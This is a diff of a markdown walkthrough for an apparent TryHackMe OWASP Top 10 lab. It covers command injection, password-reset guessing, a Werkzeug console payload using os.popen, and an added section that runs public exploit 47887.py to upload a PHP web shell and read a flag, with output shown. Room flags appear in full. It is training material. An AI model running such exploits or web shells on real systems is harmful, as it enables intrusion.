@@ -98,7 +98,7 @@ sqlite> SELECT * FROM users;
 
 ### 3.1 Command Injection (Task 10)
 
-navigate to http://Machine_IP/ and exploit the cowsay server
+navigate to http://Machine_IP:82/ and exploit the cowsay server
 
 ##
 - What strange text file is in the website's root directory?
@@ -155,7 +155,7 @@ navigate to http://Machine_IP/ and exploit the cowsay server
 
 ### 4.Insecure Design (Task 11)
 
-- Navigate to http://MACHINE_IP and get into joseph's account. 
+- Navigate to http://MACHINE_IP:85 and get into joseph's account. 
 
   - Try to reset joseph's password.
   - Try to answer the security question which validates the user's favirote color.. First TRY with VIBGEYOR(violet,indigo,blue,green,yellow,orange,red) 
@@ -167,7 +167,7 @@ navigate to http://Machine_IP/ and exploit the cowsay server
 ![Description](./Images/img10.png)
 
 
-**Flag -** THM{Not_3ven_c4tz_c0uld_sav3_U!}
+**Flag - THM{Not_3ven_c4tz_c0uld_sav3_U!}**
 
 ##
 
@@ -175,7 +175,7 @@ navigate to http://Machine_IP/ and exploit the cowsay server
 
 ### 5.Security Misconfiguration (Task 12)
 
- - Navigate to http://10.10.146.125:86/console to access the Werkzeug console.
+ - Navigate to http://MACHINE_IP:86/console to access the Werkzeug console.
 
   -  import os; print(os.popen("ls -l").read())
 
@@ -185,6 +185,41 @@ navigate to http://Machine_IP/ and exploit the cowsay server
 
   - ![Description](./Images/img12.png)
 
-  - **Flag -** THM{Just_a_tiny_misconfiguration}
+  - **Flag -** **THM{Just_a_tiny_misconfiguration}**
 
 ##  
+
+
+## 
+
+### Vulnerable and Outdated Components - Lab (Task 15)
+
+- Navigate to http://MACHINE_IP:84 where you'll find a vulnerable application. All the information you need to exploit it can be found online. 
+
+  - search and download the exploit - i.e [47887.py]
+
+  - Run the following command
+
+```bash
+python3 47887.py http://10.10.31.234:84 
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.31.234:84/bootstrap/img/8T1IdSEuVy.php
+> Example command usage: http://10.10.31.234:84/bootstrap/img/8T1IdSEuVy.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ cat /opt/flag.txt
+THM{But_1ts_n0t_my_f4ult!}
+```
+
+![Description](./Images/img13.png)
+
+- **Flag-** **THM{But_1ts_n0t_my_f4ult!}**
+
+##
+
+
+
+##
+
+
+## Identification and Authentication Failures - Practical (Task 17)
